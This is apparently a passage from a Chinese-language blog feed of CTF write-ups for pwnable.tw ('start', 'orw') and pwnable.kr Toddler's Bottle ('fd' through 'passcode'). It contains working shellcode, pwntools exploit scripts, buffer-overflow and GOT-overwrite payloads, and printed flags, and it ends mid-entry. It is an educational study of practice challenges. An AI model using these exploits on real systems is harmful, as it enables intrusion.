class="keyword">print</span> (r.recv())</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line">ret = <span class="number">0x08048087</span></span><br><span class="line">p1 = <span class="string">'a'</span>*<span class="number">20</span> + p32(ret)</span><br><span class="line">r.send(p1)</span><br><span class="line">addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">p2 = <span class="string">'a'</span>*<span class="number">20</span> + p32(addr+<span class="number">20</span>) +  shellcode</span><br><span class="line">r.send(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>shellcode还是在<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a>这上面找的。选了一个execve(‘/bin/sh’)的</p><p><img src="https://i.imgur.com/gucjr8C.png" alt=""></p><p>最后getshell，在start用户目录下找到flag文件</p><p><strong>FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</strong></p><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>题目：</p><p><a href="https://pwnable.tw/static/chall/orw" target="_blank" rel="noopener">https://pwnable.tw/static/chall/orw</a></p><p><strong>nc chall.pwnable.tw 10001</strong></p><p>看一眼保护<br><img src="https://i.imgur.com/bOYw8Dp.png" alt=""></p><p><img src="https://i.imgur.com/9ouLIFN.png" alt=""></p><p>先注意到红框和蓝框部分，蓝框部分用read读取输入之后直接call了刚刚输入的内容。。。明摆着的ret2shellcode。</p><p>但是红框里的函数没见过，简单了解一了下这个函数的作用就是让该进程进入“安全”模式，所有除了read，write，exit和sigreturn的系统调用都会触发sigkill信号来终止进程。</p><p>而题目提示我们只有open，read， write三个可用的syscall。同时又告诉了我们flag的位置：<strong>/home/orw/flag</strong></p><p>所以思路就是先用open打开flag文件，再用read读取flag文件，最后用write输出到屏幕。</p><p>先将<strong>/home/orw/flag</strong>转换成hex：</p><p><strong>2f686f6d652f6f72772f666c61670000</strong></p><p>再转成小端序：</p><p><strong>000067616c662f77726f2f656d6f682f</strong></p><p>最后的汇编代码如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:  <span class="number">31</span> c0                   <span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span><span class="comment">;</span></span><br><span class="line"><span class="number">2</span>:  <span class="number">31</span> <span class="built_in">db</span>                   <span class="keyword">xor</span>    <span class="built_in">ebx</span>,<span class="built_in">ebx</span><span class="comment">;</span></span><br><span class="line"><span class="number">4</span>:  <span class="number">31</span> c9                   <span class="keyword">xor</span>    <span class="built_in">ecx</span>,<span class="built_in">ecx</span><span class="comment">;</span></span><br><span class="line"><span class="number">6</span>:  <span class="number">31</span> d2                   <span class="keyword">xor</span>    <span class="built_in">edx</span>,<span class="built_in">edx</span><span class="comment">;清零</span></span><br><span class="line"><span class="number">8</span>:  <span class="number">68</span> <span class="number">61</span> <span class="number">67</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x6761</span><span class="comment">;</span></span><br><span class="line"><span class="symbol">d:</span>  <span class="number">68</span> <span class="number">77</span> 2f <span class="number">66</span> 6c          <span class="keyword">push</span>   <span class="number">0x6c662f77</span><span class="comment">;</span></span><br><span class="line"><span class="number">12</span>: <span class="number">68</span> <span class="number">65</span> 2f 6f <span class="number">72</span>          <span class="keyword">push</span>   <span class="number">0x726f2f65</span><span class="comment">;</span></span><br><span class="line"><span class="number">17</span>: <span class="number">68</span> 2f <span class="number">68</span> 6f <span class="number">6d</span>          <span class="keyword">push</span>   <span class="number">0x6d6f682f</span><span class="comment">;/home/orw/flag</span></span><br><span class="line">1c: b8 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x5</span><span class="comment">;system call number (open)</span></span><br><span class="line"><span class="number">21</span>: <span class="number">89</span> e3                   <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">esp</span><span class="comment">;将刚才入栈的字符串地址作为第一个参数传给open</span></span><br><span class="line"><span class="number">23</span>: cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span><span class="comment">;call kernal</span></span><br><span class="line"><span class="number">25</span>: <span class="number">89</span> d9                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">ebx</span><span class="comment">;将刚才的esp传给ecx</span></span><br><span class="line"><span class="number">27</span>: <span class="number">89</span> c3                   <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">eax</span><span class="comment">;eax接收了open的返回值后作为file descriptor赋值给ebx作为read的第一个参数</span></span><br><span class="line"><span class="number">29</span>: b8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x3</span><span class="comment">;system call number (read)</span></span><br><span class="line">2e: ba <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x30</span><span class="comment">;选一个较大的数字作为length</span></span><br><span class="line"><span class="number">33</span>: cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span><span class="comment">;call kernel</span></span><br><span class="line"><span class="number">35</span>: b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x4</span><span class="comment">;system call number (write)</span></span><br><span class="line">3a: bb <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="number">0x1</span><span class="comment">;file descriptor(stdout)</span></span><br><span class="line">3f: ba <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x30</span><span class="comment">;length</span></span><br><span class="line"><span class="number">44</span>: cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span> <span class="comment">;call kernel</span></span><br></pre></td></tr></table></figure><p>生成shellcode：</p><p><strong>“\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\xCD\x80\x89\xD9\x89\xC3\xB8\x03\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80”</strong></p><p>网址：<a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p><p>简单介绍一下linux system call：</p><p><img src="https://i.imgur.com/xcvRPTU.png" alt=""></p><ul><li>eax的用处是传递system call number</li><li>ebx，ecx，edx，esi，edi和ebp<strong>按顺序依次</strong>存放syscall的各个参数。（比如调用sys_read：eax为3，ebx为file descriptor，ecx为buffer的地址，edx为读取数据的长度。）</li><li>最后int 0x80根据eax的值来执行相关的中断</li><li>返回值通常存放在eax中</li></ul><p>最后脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = <span class="string">"\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\xCD\x80\x89\xD9\x89\xC3\xB8\x03\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80"</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10001</span>)</span><br><span class="line">r.recvuntil(<span class="string">"shellcode:"</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure><p><strong>FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools安装和使用</title>
      <link href="/2019/01/20/pwntools%E5%AE%89%E8%A3%85/"/>
      <url>/2019/01/20/pwntools%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>安装这玩意经常遇到各种莫名的问题</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装方法就老老实实的去<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools主页</a>看，被其他人写的教程坑过不止一遍。</p><p>安装方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>在执行最后一条命令时报错：<strong>Import Error:cannot import name main</strong></p><p>解决方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/bin/pip</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pip import main</span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pip._internal import main</span><br></pre></td></tr></table></figure><p>即可</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>手册：</p><p><a href="http://docs.pwntools.com/en/stable/" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr[Toddler&#39;s Bottle]</title>
      <link href="/2018/12/30/Pwnable-kr/"/>
      <url>/2018/12/30/Pwnable-kr/</url>
      
        <content type="html"><![CDATA[<p>再不更博客就生灰了，找点题做</p><p>题目链接: <a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a></p><a id="more"></a><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>这里面的题大都是需要通过ssh连接到远程服务器上做，像这样<br><img src="https://i.imgur.com/mJjmss3.png" alt=""></p><p>emmmmm，直接连就行了<br><img src="https://i.imgur.com/PfNVTJf.png" alt=""></p><p>为了方便可以scp到本地，连着服务器做确实有点卡，不是很舒服。</p><p><img src="https://i.imgur.com/QM1egPo.png" alt=""></p><pre><code>scp -r -P2222 fd@pwnable.kr:/home/fd .</code></pre><p><strong>-r</strong>是复制整个目录，<strong>-P</strong>端口一定要大写</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>题目: <strong>ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看源码知道，输入的第一个参数减去0x1234后作为read的第一个参数。</p><p>当read的第一个参数为0的时候表示从stdin读取数据。</p><pre><code>fd@ubuntu:~$ ./fd $(python -c &apos;print &quot;4660&quot;&apos;)LETMEWINgood job :)mommy! I think I know what a file descriptor is!!</code></pre><p>:)</p><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>题目: <strong>ssh <a href="mailto:col@pwnable.kr" target="_blank" rel="noopener">col@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求输入长度20个字节的数据，check_password将char指针强制转换为int，所以每4个字节一循环，加在res上，最后如果res == hashcode就拿flag。</p><p>所以，构造。(注意构造的数字里不能出现空字符\x00）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0x21dd09ec</span>-(<span class="number">0x01010101</span>)*<span class="number">4</span>)</span><br><span class="line"><span class="string">'0x1dd905e8'</span></span><br></pre></td></tr></table></figure><pre><code>col@ubuntu:~$ ./col $(python -c &quot;print &apos;\x01&apos; * 16 + &apos;\xE8\x05\xD9\x1D&apos;&quot;)daddy! I just managed to create a hash collision :)</code></pre><p>:)</p><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>题目: </p><p>Download : <strong><a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a></strong></p><p>Download : <strong><a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a></strong></p><p>Running at : <strong>nc pwnable.kr 9000</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次直接给了elf文件。扔进ida</p><p><img src="https://i.imgur.com/6xhHT9D.png" alt=""></p><p>可以看到蓝色为overflow的地址，紫色为key的地址，相差0x2c+0x8 = 0x34 = 52个字节</p><p><img src="https://i.imgur.com/oXRSZsU.png" alt=""></p><p>:)</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>题目: <strong><a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a></strong></p><p>题目提示逆向</p><p>扔进ida</p><p><img src="https://i.imgur.com/J8u8gC5.png" alt=""><br>应该是upx加壳了</p><p><img src="https://i.imgur.com/rRYg8Uk.png" alt=""><br>所以自然就要脱壳</p><p><img src="https://i.imgur.com/YEPb1u8.png" alt=""><br>再扔进ida，注意到flag，跳转</p><p><img src="https://i.imgur.com/st63yfb.png" alt=""><br>拿到flag</p><p>:)</p><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>题目: <strong>ssh <a href="mailto:passcode@pwnable.kr" target="_blank" rel="noopener">passcode@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> passcode1;</span><br><span class="line">        <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">        <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// something after login...</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一眼开了什么保护，应该没什么大碍<br><img src="https://i.imgur.com/wsKfmTO.png" alt=""></p><p>有两个地方很扎眼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">...</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br></pre></td></tr></table></figure><p>很明显passcode1，passcode2前面少了&amp;</p><p>这就意味着scanf会以为passcode里存放的值是passcode的地址，然后将stdin的数据存放在passcode指向的地址里。所以，如果我们能控制passcode里的值，那在输入passcode的时候就能实现任意位置写。</p><p>先从<code>welcome()</code>开始看</p><p><img src="https://i.imgur.com/LDKC2Ya.png" alt=""><br>注意到这里是name[]的地址</p><p><img src="https://i.imgur.com/WAXfITc.png" alt=""><br>得到了<strong>0xbfe72b28</strong></p><p><img src="https://i.imgur.com/Oq1j17w.png" alt=""><br>再找passcode1的地址。注意这里有一个坑点，由于源代码中没有加&amp;,所以这里反汇编出来的代码就从lea变成mov了，所以直接用ebp-0x10就好，别去看edx。</p><p>最后得到passcode1地址为<strong>0xbfe72b88</strong>，同理得到passcode2的地址为<strong>0xbfe72b8c</strong></p><p>passcode1 - name = 0x60 = 96</p><p>passcode2 - name = 0x64 = 100</p><p>发现name的最后4个字节的数据可以覆盖到passcode1的值，而passcode2够不着不管他，有一个就够了。</p><p>所以可以利用plt和got表。只需要将passcode1的值覆盖为(某个函数)的plt地址，在输入passcode1时输入源码中system函数的地址，该地址将(某个函数)的got表项覆盖掉，所以在调用(某个函数)时就跳转到了system函数帮我们执行/bin/sh。</p><p>看一眼开了什么保护，relro为partial relro，所以got可写，成了。<br><img src="https://i.imgur.com/wsKfmTO.png" alt=""></p><p>选一个输入passcode1后的程序中用到的函数，比如fflush<br><img src="https://i.imgur.com/q97Ytsi.png" alt=""><br>为<strong>0x804a004</strong></p><p><img src="https://i.imgur.com/ZuGfGAr.png" alt=""><br>然后system地址为<strong>0x080485e3</strong>,因为要给system传参(/bin/sh)，所以不能选下面那个地址(不然就没参数传进去了)</p><p>把system地址换成dec</p><pre><code>passcode@ubuntu:~$ python -c &apos;print &quot;A&quot;*96 + &quot;\x04\xa0\x04\x08&quot; + &quot;134514147&quot;&apos; | ./passcodeToddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :)</code></pre><p>:)</p><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>题目: <strong>ssh <a href="mailto:random@pwnable.kr" target="_blank" rel="noopener">random@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td 